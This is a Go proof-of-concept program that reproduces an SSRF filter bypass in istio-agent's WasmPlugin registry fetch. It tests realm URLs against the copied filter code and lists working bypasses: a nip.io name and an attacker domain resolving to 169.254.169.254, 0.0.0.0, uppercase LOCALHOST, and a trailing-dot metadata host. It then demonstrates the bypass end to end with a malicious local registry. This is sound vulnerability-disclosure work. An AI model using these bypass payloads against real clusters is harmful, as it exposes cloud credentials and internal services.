package main

// SSRF-filter bypass reproducer for istio-agent WasmPlugin OCI fetch.
//
// The three functions below (ssrfProtectionTransport.RoundTrip, validateAllRealms,
// validateRealmURL) are COPIED VERBATIM from:
//   /home/user/istio/pkg/wasm/imagefetcher.go  lines 69-156
// They use only the Go standard library (net, net/url, net/http, strings, fmt),
// so this copy compiles to byte-identical logic. We cannot import package `wasm`
// directly because its go-containerregistry / docker-cli deps are not in the
// local module cache (offline). This harness therefore exercises the ACTUAL
// filter logic against the exact WWW-Authenticate header strings a malicious
// OCI registry would return.

import (
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
)

// ===== BEGIN verbatim copy from pkg/wasm/imagefetcher.go (69-156) =====

// ssrfProtectionTransport wraps http.RoundTripper to block SSRF via bearer realm
type ssrfProtectionTransport struct {
	inner http.RoundTripper
}

func (t *ssrfProtectionTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	resp, err := t.inner.RoundTrip(req)
	if err != nil || resp == nil {
		return resp, err
	}

	// check 401 responses for malicious WWW-Authenticate realm
	// check ALL headers as the server can return multiple, and library might use any
	if resp.StatusCode == http.StatusUnauthorized {
		for _, auth := range resp.Header.Values("WWW-Authenticate") {
			if err := validateAllRealms(auth); err != nil {
				resp.Body.Close()
				return nil, fmt.Errorf("rejected unsafe bearer realm: %w", err)
			}
		}
	}

	return resp, nil
}

// validateAllRealms checks all realm parameters in a WWW-Authenticate header.
// in case of multiple challenges - validate all of them.
func validateAllRealms(wwwAuth string) error {
	// find all realm="..." occurrences
	remaining := wwwAuth
	for {
		idx := strings.Index(remaining, "realm=\"")
		if idx == -1 {
			break
		}
		remaining = remaining[idx+7:] // skip 'realm="'

		end := strings.Index(remaining, "\"")
		if end == -1 {
			break
		}
		realm := remaining[:end]
		remaining = remaining[end+1:]

		if err := validateRealmURL(realm); err != nil {
			return err
		}
	}
	return nil
}

func validateRealmURL(realm string) error {
	u, err := url.Parse(realm)
	if err != nil {
		return fmt.Errorf("invalid realm URL: %w", err)
	}

	// block non-http schemes (file://, gopher://, dict://, etc)
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("realm scheme %q not allowed", u.Scheme)
	}

	host := u.Hostname()
	if host == "" {
		return fmt.Errorf("realm missing host")
	}

	// block known cloud metadata DNS names
	if host == "metadata.google.internal" {
		return fmt.Errorf("realm targets cloud metadata service")
	}

	// block localhost DNS name (ParseIP returns nil for hostnames)
	if host == "localhost" {
		return fmt.Errorf("realm targets localhost")
	}

	// block private, loopback, and link-local IP ranges
	// covers 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (private)
	// covers 127.0.0.0/8, ::1 (loopback)
	// covers 169.254.0.0/16, fe80::/10 (link-local, includes cloud metadata 169.254.169.254)
	ip := net.ParseIP(host)
	if ip != nil && (ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast()) {
		return fmt.Errorf("realm targets private/loopback/link-local IP")
	}

	return nil
}

// ===== END verbatim copy =====

// wwwAuth builds the exact WWW-Authenticate value a registry returns on a 401.
func wwwAuth(realm string) string {
	return fmt.Sprintf(`Bearer realm="%s",service="registry.example.com",scope="repository:x:pull"`, realm)
}

func main() {
	fmt.Println("== Part A: does the filter block or allow each realm? (validateAllRealms) ==")
	cases := []struct {
		label    string
		realm    string
		intent   string // "blocked" = mitigation should stop; "reaches internal"
	}{
		{"literal 169.254.169.254 (cloud metadata)", "http://169.254.169.254/latest/meta-data/", "SHOULD be blocked"},
		{"literal 127.0.0.1 (loopback)", "http://127.0.0.1:15000/", "SHOULD be blocked"},
		{"metadata.google.internal", "http://metadata.google.internal/computeMetadata/v1/", "SHOULD be blocked"},
		{"localhost", "http://localhost:15000/", "SHOULD be blocked"},
		// --- bypasses ---
		{"DNS name -> 169.254.169.254 (nip.io)", "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/", "BYPASS -> metadata"},
		{"attacker DNS A->169.254.169.254", "http://metadata.evil.example.com/", "BYPASS -> metadata"},
		{"0.0.0.0 (routes to loopback on Linux)", "http://0.0.0.0:15000/", "BYPASS -> agent loopback"},
		{"uppercase LOCALHOST", "http://LOCALHOST:15000/", "BYPASS -> loopback"},
		{"metadata.google.internal. (trailing dot)", "http://metadata.google.internal./computeMetadata/v1/", "BYPASS -> metadata"},
		{"uppercase Metadata.Google.Internal", "http://Metadata.Google.Internal/computeMetadata/v1/", "BYPASS -> metadata"},
	}
	for _, c := range cases {
		err := validateAllRealms(wwwAuth(c.realm))
		verdict := "ALLOWED (passes filter)"
		if err != nil {
			verdict = "BLOCKED: " + err.Error()
		}
		fmt.Printf("  [%-42s] %-24s -> %s\n", c.label, c.intent, verdict)
	}

	fmt.Println("\n== Part B: raw net.IP classification for the bypass IPs ==")
	for _, h := range []string{"169.254.169.254", "127.0.0.1", "0.0.0.0", "169.254.169.254.nip.io"} {
		ip := net.ParseIP(h)
		if ip == nil {
			fmt.Printf("  %-24s ParseIP=nil (treated as hostname -> IP checks SKIPPED, DNS-resolved at dial)\n", h)
			continue
		}
		fmt.Printf("  %-24s ParseIP=%v private=%v loopback=%v linklocal=%v\n",
			h, ip, ip.IsPrivate(), ip.IsLoopback(), ip.IsLinkLocalUnicast())
	}

	fmt.Println("\n== Part C: end-to-end through the ACTUAL ssrfProtectionTransport ==")
	// "internal" service the attacker wants the agent to reach (stands in for
	// cloud metadata / a loopback-only admin API). It listens on 127.0.0.1.
	var internalHit bool
	internal := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		internalHit = true
		fmt.Printf("    >>> INTERNAL SERVICE RECEIVED REQUEST: %s %s\n", r.Method, r.URL.String())
		fmt.Fprint(w, `{"token":"SENSITIVE-INTERNAL-DATA"}`)
	}))
	defer internal.Close()
	_, internalPort, _ := net.SplitHostPort(strings.TrimPrefix(internal.URL, "http://"))

	// Malicious registry: on GET /v2/ it returns 401 with a bearer realm that
	// points (via 0.0.0.0, which the filter fails to block) at the internal svc.
	// This is exactly what go-containerregistry's transport.Ping sees.
	bypassRealm := fmt.Sprintf("http://0.0.0.0:%s/token", internalPort)
	registry := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("WWW-Authenticate", wwwAuth(bypassRealm))
		w.WriteHeader(http.StatusUnauthorized)
	}))
	defer registry.Close()

	// The agent's registry client uses remote.WithTransport(&ssrfProtectionTransport{...}).
	client := &http.Client{Transport: &ssrfProtectionTransport{inner: http.DefaultTransport}}

	// Step 1: transport.Ping equivalent — GET /v2/ . The 401 passes through the
	// ACTUAL RoundTrip gate. If the gate blocks, we get an error here.
	resp, err := client.Get(registry.URL + "/v2/")
	if err != nil {
		fmt.Printf("    gate BLOCKED the 401 (mitigation worked): %v\n", err)
		return
	}
	got := resp.Header.Get("WWW-Authenticate")
	resp.Body.Close()
	fmt.Printf("    gate ALLOWED 401; realm handed to go-containerregistry = %q\n", got)

	// Step 2: go-containerregistry parses the realm and GETs it (token refresh),
	// through the SAME transport (token endpoint returns 200 -> not gated).
	realm := parseRealm(got)
	tok, err := client.Get(realm + "?scope=repository:x:pull&service=registry.example.com")
	if err != nil {
		fmt.Printf("    token fetch error: %v\n", err)
	} else {
		tok.Body.Close()
	}

	fmt.Printf("\n    RESULT: internal service reached by istio-agent transport = %v\n", internalHit)
	if internalHit {
		fmt.Println("    *** SSRF CONFIRMED: mitigation bypassed, agent issued request to internal target ***")
	}
}

// parseRealm extracts the realm URL from a Bearer WWW-Authenticate header,
// mirroring go-containerregistry/pkg/v1/remote/transport.parseChallenge.
func parseRealm(h string) string {
	i := strings.Index(h, `realm="`)
	if i == -1 {
		return ""
	}
	rest := h[i+7:]
	j := strings.Index(rest, `"`)
	if j == -1 {
		return ""
	}
	return rest[:j]
}
